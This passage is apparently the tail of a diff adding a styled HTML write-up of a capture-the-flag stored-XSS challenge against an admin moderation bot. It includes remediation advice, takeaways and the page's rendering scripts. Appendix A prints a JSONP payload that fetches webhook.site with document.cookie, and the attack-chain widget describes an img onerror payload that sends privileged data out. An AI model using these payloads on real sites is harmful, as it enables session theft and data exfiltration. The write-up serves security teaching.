+- It grants access to an **admin-only resource (channel 11)** that is unreachable from the public internet — even replaying a valid stolen session cookie returns `channel not available`. The privilege is tied to the bot's request context, so the data can only be read from inside the bot. This was demonstrated by exfiltrating the privileged stream and recovering the flag.
+
+In a production equivalent, this pattern enables theft of admin-only data, actions performed with admin privileges, and potential session/token compromise — all triggered by a single report submission (no login required) that only needs an admin to later view it.
+
+**Confidentiality: High** (privileged channel read) **· Integrity: Low · Availability: None.**
+
+## 8. Root cause & remediation
+
+**Root cause.** Allow-list validation that only checks the first character of `channelId`, combined with unencoded reflection of that value into the moderation page's HTML context.
+
+| Layer | Problem | Fix |
+|---|---|---|
+| **Input validation** | Only checks the first character is a digit | Validate as a strict integer: `^\d+$` or parse-to-int and reject on failure |
+| **Output encoding** | `channelId` reflected unencoded into `/moderate/{id}` | HTML-encode all user-supplied values before rendering |
+| **CSP** | Inline `onerror` executes freely | Serve CSP on the moderation page without `unsafe-inline` for scripts |
+| **JSONP gadget** | `/api/jsonp?callback=` reflects arbitrary JS | Allow-list callbacks (`^[A-Za-z_$][\w$]*$`) or remove the endpoint |
+
+The first row alone kills this bug; the rest are defence-in-depth so a future regression doesn't reopen it.
+
+## 9. Takeaways
+
+- **"Starts with a digit" is not "is a number."** Partial-character validation is a recurring source of injection. Anchor your patterns (`^…$`) and prefer parse-and-reject over substring checks.
+- **Self-XSS becomes real XSS when a privileged automated client renders your input.** The moderation bot is the pivot; always ask *who else renders this value, and with what privileges?*
+- **A stolen credential isn't always a stolen capability.** Channel 11's privilege was bound to the bot's request context, not just its cookie — so the exploit had to run *inside* the bot. Recognising that saved time otherwise wasted replaying tokens from the outside.
+- **Confirm, don't guess.** The download path was derived from a template observed on channels we controlled, then combined with a filename only the bot could produce — inference from observed behaviour, not a lucky URL.
+- **A slow bot looks exactly like a broken exploit.** On shared, rate-limited queues, patience and light retry logic are part of the exploit.
+
+---
+
+**Flag:** `INTIGRITI{019ff176-bc01-7543-9e81-46e417c8b39b}`
+
+*(Fun aside: that flag UUID is a UUIDv7 — the `7` version nibble and time-ordered prefix are a cute nod to the TV "channel time" theme.)*
+
+---
+
+## Appendix A — The JSONP gadget (unused, but real)
+
+`GET /api/jsonp?callback=` reflects `callback` into an executable `application/javascript` response with no sanitisation:
+
+```http
+GET /api/jsonp?callback=fetch('https://webhook.site/UUID/?c='+document.cookie)
+-> /**/ fetch('...')({"channels": 10});
+```
+
+If the moderation page shipped a strict `script-src 'self'` CSP, this same-origin script endpoint would be the bypass — load it as a `<script&#32;src>` and execute arbitrary JS from an allowed origin. In this challenge the moderation page executed **raw HTML injection directly**, so the gadget was never needed. It stays in the write-up because it's exactly the kind of primitive that turns a "mitigated by CSP" XSS back into a live one, and it's worth flagging in any real report.
+
+## Appendix B — Pitfalls that make the PoC look broken
+
+| Symptom | Cause | Fix |
+|---|---|---|
+| Nothing hits the webhook | Bot queue is slow / under load | Wait; processing ranges ~10 s to several minutes |
+| `Too many reports submitted!` | Rate limit on `/api/report` | Space requests; retry after ~30 s |
+| Stolen cookie -> `channel not available` | Privilege is context-bound, not cookie-bound | Exfil must run **inside** the bot |
+| Guessed stream URL 404s | Filename is a non-guessable hash | Only the bot's `GET /api/channels/11/load` yields it |
+| Payload runs on *my* TV, no flag | That's self-XSS | Impact requires the **bot** to render it |
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/marked@13/marked.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<script>
+(function(){
+var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+/* ---------- CRT STATIC (hero signature) ---------- */
+(function(){
+  var cv = document.getElementById('static'); if(!cv) return;
+  var ctx = cv.getContext('2d', { alpha:true });
+  var W=0,H=0, cell=2, off, octx, raf=null, running=true;
+  function size(){
+    var r = cv.parentElement.getBoundingClientRect();
+    W = Math.max(320, r.width|0); H = Math.max(260, r.height|0);
+    var dpr = 1; // static is noise; keep it cheap
+    cv.width = Math.ceil(W/cell); cv.height = Math.ceil(H/cell);
+    cv.style.width = W+'px'; cv.style.height = H+'px';
+    off = document.createElement('canvas'); off.width=cv.width; off.height=cv.height;
+    octx = off.getContext('2d');
+  }
+  function frame(){
+    var w=cv.width,h=cv.height, img=octx.createImageData(w,h), d=img.data;
+    for(var i=0;i<d.length;i+=4){
+      var v = (Math.random()*255)|0;
+      // faint cyan/amber tint in the noise so it feels "on-brand", mostly grey
+      d[i]   = v*0.82 + 20;         // r
+      d[i+1] = v*0.92 + 26;         // g
+      d[i+2] = v*0.98 + 34;         // b
+      d[i+3] = 46 + ((Math.random()*40)|0); // low alpha -> subtle
+    }
+    octx.putImageData(img,0,0);
+    ctx.clearRect(0,0,w,h);
+    ctx.drawImage(off,0,0);
+    // occasional horizontal "roll" band
+    if(Math.random()<0.10){
+      var by = (Math.random()*h)|0, bh = 2+((Math.random()*3)|0);
+      ctx.fillStyle='rgba(90,212,198,0.05)'; ctx.fillRect(0,by,w,bh);
+    }
+  }
+  var last=0, fps= reduce?0:14, iv=1000/(fps||1);
+  function loop(t){
+    if(!running){ raf=null; return; }
+    if(!reduce && t-last>=iv){ frame(); last=t; }
+    raf=requestAnimationFrame(loop);
+  }
+  size(); frame();
+  if(!reduce) raf=requestAnimationFrame(loop);
+  window.addEventListener('resize', function(){ size(); frame(); }, {passive:true});
+  // pause when hero scrolled away (perf + battery)
+  if('IntersectionObserver' in window){
+    new IntersectionObserver(function(es){
+      es.forEach(function(e){
+        running = e.isIntersecting;
+        if(running && !raf && !reduce) raf=requestAnimationFrame(loop);
+      });
+    }, {threshold:0}).observe(cv);
+  }
+})();
+
+/* ---------- "NO SIGNAL" -> "LIVE" once tuner reveals ---------- */
+(function(){
+  var live = document.querySelector('.eyebrow .live');
+  var screen = document.getElementById('tunerScreen');
+  if(!screen) return;
+  function tuneIn(){
+    screen.classList.remove('tuning');
+    if(live){ live.childNodes[live.childNodes.length-1].nodeValue='LIVE · CH 11'; live.style.color='var(--cyan)';
+      var dot=live.querySelector('b'); if(dot) dot.style.background='var(--cyan)', dot.style.boxShadow='0 0 8px var(--cyan)'; }
+  }
+  if(reduce){ tuneIn(); return; }
+  // brief "tuning" scramble on the flag, then lock
+  var flag = document.getElementById('tunerFlag');
+  var real = flag.textContent, glyph='ABCDEF0123456789-{}', steps=0, max=16;
+  var t = setInterval(function(){
+    steps++;
+    if(steps>=max){ clearInterval(t); flag.textContent=real; tuneIn(); return; }
+    var out=''; for(var i=0;i<real.length;i++){
+      out += /[{}\-]/.test(real[i]) ? real[i] : glyph[(Math.random()*glyph.length)|0];
+    }
+    flag.textContent=out;
+  }, 55);
+})();
+
+/* ---------- reading progress ---------- */
+(function(){
+  var bar=document.getElementById('progress');
+  function upd(){
+    var h=document.documentElement, sc=h.scrollTop||document.body.scrollTop,
+        max=(h.scrollHeight-h.clientHeight)||1;
+    bar.style.width=Math.min(100,(sc/max)*100)+'%';
+  }
+  window.addEventListener('scroll',upd,{passive:true}); upd();
+})();
+
+/* ---------- interactive attack chain ---------- */
+(function(){
+  var steps=[
+    {n:'01', t:'Submit report', d:'<code>POST /api/report</code> with <code>channelId=1&lt;img src=x onerror=…&gt;</code>. Validation only checks the value <strong>starts with a digit</strong>, so the markup passes and is <strong>stored</strong>.'},
+    {n:'02', t:'Bot moderates', d:'The report is queued for a shared <strong>admin bot</strong>, which opens <code>/moderate/{id}</code> in HeadlessChrome. The <code>channelId</code> is reflected <strong>unencoded</strong> into that page.'},
+    {n:'03', t:'XSS as admin', d:'The broken <code>&lt;img&gt;</code> fires <code>onerror</code> — our JavaScript now runs in the <strong>bot\u2019s privileged context</strong>, not ours.'},
+    {n:'04', t:'Read channel 11', d:'From inside the bot, <code>fetch(\'/api/channels/11/load\')</code> returns the admin-only stream filename. The same request from the public internet — even with a stolen cookie — returns <code>channel not available</code>.'},
+    {n:'05', t:'Exfil filename', d:'The payload sends the <code>&lt;hash&gt;.mp4</code> filename to our <strong>webhook</strong>. That filename is the one piece we could not obtain ourselves.'},
+    {n:'06', t:'Download → flag', d:'Combine the filename with the known template <code>/static/streams/{filename}</code> (confirmed from channels 1–10), download the video, and read the flag off the frame.'}
+  ];
+  var track=document.getElementById('chainTrack'), detail=document.getElementById('chainDetail');
+  if(!track) return;
+  var btns=[];
+  steps.forEach(function(s,i){
+    var b=document.createElement('button'); b.className='chain__step'; b.type='button';
+    b.innerHTML='<span class="n">'+s.n+'</span><span class="t">'+s.t+'</span><span class="arrow">→</span>';
+    b.addEventListener('click',function(){ set(i); });
+    b.addEventListener('mouseenter',function(){ set(i); });
+    track.appendChild(b); btns.push(b);
+  });
+  function set(i){
+    btns.forEach(function(b,j){ b.classList.toggle('active', j===i); });
+    detail.innerHTML=steps[i].d;
+  }
+  set(0);
+})();
+
+/* ---------- markdown render ---------- */
+var slug=function(s){return s.toLowerCase().trim().replace(/[^\w\s-]/g,'').replace(/\s/g,'-');};
+var content=document.getElementById('content');
+var src=document.getElementById('source').textContent;
+try{ content.innerHTML=marked.parse(src); }catch(e){ content.textContent=src; }
+content.querySelectorAll('h1,h2,h3,h4').forEach(function(h){ if(!h.id) h.id=slug(h.textContent); });
+/* mark the "key insight" blockquote */
+content.querySelectorAll('blockquote').forEach(function(bq){
+  if(/stealing the bot/i.test(bq.textContent)) bq.classList.add('key');
+});
+/* mermaid extract */
+content.querySelectorAll('pre > code.language-mermaid').forEach(function(code){
+  var pre=code.parentElement, wrap=document.createElement('div'); wrap.className='mermaid-wrap';
+  var m=document.createElement('pre'); m.className='mermaid'; m.textContent=code.textContent;
+  wrap.appendChild(m); pre.replaceWith(wrap);
+});
+var alias={jsonc:'json',jsx:'javascript',console:'bash',text:'plaintext'};
+content.querySelectorAll('pre code[class*="language-"]').forEach(function(code){
+  var mm=code.className.match(/language-([\w-]+)/);
+  if(mm&&alias[mm[1]]) code.className=code.className.replace('language-'+mm[1],'language-'+alias[mm[1]]);
+});
+content.querySelectorAll('pre code').forEach(function(c){ try{ hljs.highlightElement(c); }catch(e){} });
+content.querySelectorAll('pre').forEach(function(pre){
+  var codeEl=pre.querySelector('code'); if(!codeEl) return;
+  var text=codeEl.innerText;
+  var btn=document.createElement('button'); btn.className='copy-btn'; btn.type='button'; btn.textContent='Copy';
+  btn.addEventListener('click',function(){ navigator.clipboard.writeText(text).then(function(){ btn.textContent='Copied'; setTimeout(function(){btn.textContent='Copy';},1400); }); });
+  pre.appendChild(btn);
+});
+try{
+  mermaid.initialize({ startOnLoad:false, securityLevel:'loose', theme:'base',
+    themeVariables:{ fontFamily:'JetBrains Mono, monospace', fontSize:'13px', background:'transparent',
+      primaryColor:'#141924', primaryTextColor:'#d7dee9', primaryBorderColor:'#2e3a4f',
+      lineColor:'#8b97a8', secondaryColor:'#10141d', tertiaryColor:'#10141d',
+      actorBkg:'#141924', actorBorder:'#2e3a4f', actorTextColor:'#d7dee9', actorLineColor:'#2e3a4f',
+      signalColor:'#8b97a8', signalTextColor:'#c7d0dc',
+      noteBkgColor:'#1a2130', noteTextColor:'#d7dee9', noteBorderColor:'#2e3a4f' }});
+  mermaid.run({ querySelector:'#content .mermaid' });
+}catch(e){}
+
+/* ToC + scrollspy */
+var toc=document.getElementById('toc');
+var heads=[].slice.call(content.querySelectorAll('h2'));
+heads.forEach(function(h){ var a=document.createElement('a'); a.href='#'+h.id; a.textContent=h.textContent; a.dataset.target=h.id; toc.appendChild(a); });
+var links={}; [].forEach.call(toc.querySelectorAll('a'),function(a){ links[a.dataset.target]=a; });
+if('IntersectionObserver' in window){
+  var obs=new IntersectionObserver(function(entries){
+    entries.forEach(function(en){ if(en.isIntersecting){
+      Object.keys(links).forEach(function(k){ links[k].classList.remove('active'); });
+      if(links[en.target.id]) links[en.target.id].classList.add('active');
+    }});
+  },{ rootMargin:'-12% 0px -80% 0px', threshold:0 });
+  heads.forEach(function(h){ obs.observe(h); });
+}
+
+/* flag copy + back to top */
+var fc=document.getElementById('flagcopy');
+if(fc) fc.addEventListener('click',function(){ navigator.clipboard.writeText(document.getElementById('tunerFlag').textContent).then(function(){ fc.textContent='Copied'; setTimeout(function(){fc.textContent='Copy';},1400); }); });
+var tt=document.getElementById('totop');
+tt.addEventListener('click',function(){ window.scrollTo({top:0,behavior:'smooth'}); });
+window.addEventListener('scroll',function(){ if(window.scrollY>700) tt.classList.add('show'); else tt.classList.remove('show'); },{passive:true});
+})();
+</script>
+</body>
+</html>
